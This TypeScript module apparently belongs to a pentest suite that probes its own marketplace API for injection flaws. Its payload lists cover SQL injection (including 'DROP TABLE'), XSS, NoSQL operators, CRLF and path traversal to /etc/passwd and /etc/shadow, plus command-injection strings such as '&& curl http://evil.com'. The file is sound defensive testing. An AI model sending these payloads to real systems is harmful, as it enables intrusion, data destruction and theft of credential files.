/**
 * TEST 3: Injection Attacks
 *
 * Tests SQL injection, NoSQL injection, XSS, command injection, CRLF injection.
 * OWASP: A03:2021 — Injection
 */

import { CONFIG } from "../pentest.config";
import { login, record, request } from "../pentest.utils";

export async function testInjection() {
  console.log("\n─── Injection Attacks ───");

  // Get a token if possible
  const token = await login(CONFIG.CUSTOMER.email, CONFIG.CUSTOMER.password);

  // ═══════════════════════════════════════
  // SQL INJECTION
  // ═══════════════════════════════════════

  // 3.1 SQL injection in login email field
  const sqlPayloads = [
    "admin' OR '1'='1' --",
    "admin'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "admin'/**/OR/**/1=1--",
    "1' OR '1' = '1'; --",
  ];

  for (const payload of sqlPayloads) {
    const res = await request("POST", "/auth/login", {
      body: { email: payload, password: "anything" },
    });
    const isBlocked =
      res.status === 400 || // Validation error (IsEmail blocks it)
      res.status === 401 || // Generic auth error
      res.status === 422 || // Unprocessable entity
      res.status === 429 || // Rate limited (also counts as blocked)
      res.status === 403;   // WAF / firewall block
    record({
      name: `SQLi in login — ${payload.substring(0, 30)}`,
      category: "Injection",
      severity: "CRITICAL",
      status: isBlocked ? "PASS" : "FAIL",
      description: isBlocked
        ? `SQL injection blocked (status ${res.status})`
        : `Unexpected response ${res.status}: ${JSON.stringify(res.body).substring(0, 200)}`,
      details: `Payload: ${payload}`,
    });
  }

  // 3.2 SQL injection in query parameters
  const sqliQueryPaths = [
    "/shops?search=' OR 1=1 --",
    "/shops?search='; DROP TABLE shops; --",
    "/materials/market-rates?country=' UNION SELECT * FROM users --",
  ];

  for (const path of sqliQueryPaths) {
    const res = await request("GET", path, { token: token || undefined });
    record({
      name: `SQLi in query — ${path.substring(0, 40)}`,
      category: "Injection",
      severity: "HIGH",
      status: res.status !== 500 ? "PASS" : "FAIL",
      description:
        res.status !== 500
          ? `No server error from SQL injection attempt (${res.status})`
          : "Server error 500 — possible SQL injection vulnerability",
      details: `Path: ${path}, Status: ${res.status}`,
    });
  }

  // ═══════════════════════════════════════
  // XSS (Stored & Reflected)
  // ═══════════════════════════════════════

  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    '{{constructor.constructor("return this")()}}',
    "${7*7}",
    "{{7*7}}",
  ];

  // 3.3 XSS in RFQ builder description
  for (const payload of xssPayloads.slice(0, 3)) {
    const res = await request("POST", "/marketplace-intelligence/rfq-builder", {
      body: {
        description: payload,
        budgetHint: payload,
      },
      token: token || undefined,
    });
    // Check if the response reflects the XSS payload unescaped
    const reflected = res.raw.includes(payload);
    record({
      name: `XSS in RFQ builder — ${payload.substring(0, 25)}`,
      category: "Injection",
      severity: "HIGH",
      status: reflected ? "WARN" : "PASS",
      description: reflected
        ? "XSS payload reflected in response — check if stored"
        : "XSS payload not reflected in response",
      details: `Status: ${res.status}`,
    });
  }

  // 3.4 XSS in registration (stored XSS attempt)
  const xssRegister = await request("POST", "/auth/register", {
    body: {
      firstName: '<script>alert("XSS")</script>',
      lastName: "<img src=x onerror=alert(1)>",
      email: "xss-test-" + Date.now() + "@test.com",
      password: "SecurePass123!",
      phone: "9876543210",
      countryCode: "+977",
      role: "CUSTOMER",
      turnstileToken: "fake-token",
    },
  });
  record({
    name: "XSS in registration fields",
    category: "Injection",
    severity: "HIGH",
    status:
      xssRegister.status === 400 || xssRegister.status === 403
        ? "PASS"
        : "WARN",
    description:
      xssRegister.status === 400
        ? "Registration correctly rejected XSS in name fields"
        : `Registration responded with ${xssRegister.status} — verify output encoding when displaying user names`,
    recommendation:
      "Sanitize and HTML-encode all user-supplied strings before storing and displaying",
  });

  // ═══════════════════════════════════════
  // NOSQL INJECTION
  // ═══════════════════════════════════════

  // 3.5 NoSQL injection in login (Prisma should be safe, but test anyway)
  const nosqlPayloads = [
    { email: { $gt: "" }, password: { $gt: "" } },
    { email: { $regex: ".*" }, password: { $regex: ".*" } },
    { email: { $ne: null }, password: { $ne: null } },
  ];

  for (const payload of nosqlPayloads) {
    const res = await request("POST", "/auth/login", {
      body: payload,
    });
    record({
      name: `NoSQL injection in login`,
      category: "Injection",
      severity: "HIGH",
      status: res.status === 400 || res.status === 401 ? "PASS" : "FAIL",
      description:
        res.status === 400 || res.status === 401
          ? `NoSQL injection blocked (${res.status}) — class-validator rejects non-string`
          : `Unexpected response ${res.status}`,
      details: `Payload: ${JSON.stringify(payload).substring(0, 100)}`,
    });
  }

  // ═══════════════════════════════════════
  // COMMAND INJECTION
  // ═══════════════════════════════════════

  // 3.6 Command injection in search/input fields
  const cmdPayloads = [
    "; cat /etc/passwd",
    "| ls -la",
    "$(whoami)",
    "`whoami`",
    "&& curl http://evil.com",
  ];

  for (const payload of cmdPayloads) {
    const res = await request("POST", "/marketplace-intelligence/rfq-builder", {
      body: { description: payload },
      token: token || undefined,
    });
    record({
      name: `Command injection — ${payload.substring(0, 20)}`,
      category: "Injection",
      severity: "HIGH",
      status: res.status !== 500 ? "PASS" : "FAIL",
      description:
        res.status !== 500
          ? `No server error from command injection attempt (${res.status})`
          : "Server error 500 — possible command injection",
    });
  }

  // ═══════════════════════════════════════
  // CRLF INJECTION
  // ═══════════════════════════════════════

  // 3.7 CRLF injection in headers
  const crlfRes = await request("GET", "/health", {
    headers: {
      "X-Custom": "value\r\nInjected-Header: malicious",
    },
  });
  record({
    name: "CRLF injection in headers",
    category: "Injection",
    severity: "MEDIUM",
    status: !crlfRes.headers.get("injected-header") ? "PASS" : "FAIL",
    description: !crlfRes.headers.get("injected-header")
      ? "CRLF injection not reflected in response headers"
      : "CRLF injection successful — response contains injected header",
  });

  // ═══════════════════════════════════════
  // PATH TRAVERSAL
  // ═══════════════════════════════════════

  // 3.8 Path traversal attempts
  const traversalPaths = [
    "/../../etc/passwd",
    "/../../../etc/shadow",
    "/..%2F..%2F..%2Fetc%2Fpasswd",
    "/health/..%252f..%252fauth/login",
  ];

  for (const path of traversalPaths) {
    const res = await request("GET", path);
    record({
      name: `Path traversal — ${path.substring(0, 30)}`,
      category: "Injection",
      severity: "HIGH",
      status: res.status === 404 || res.status === 400 || res.status === 403 ? "PASS" : "WARN",
      description: `Path traversal returned ${res.status}`,
      details: `Response: ${JSON.stringify(res.body).substring(0, 100)}`,
    });
  }
}
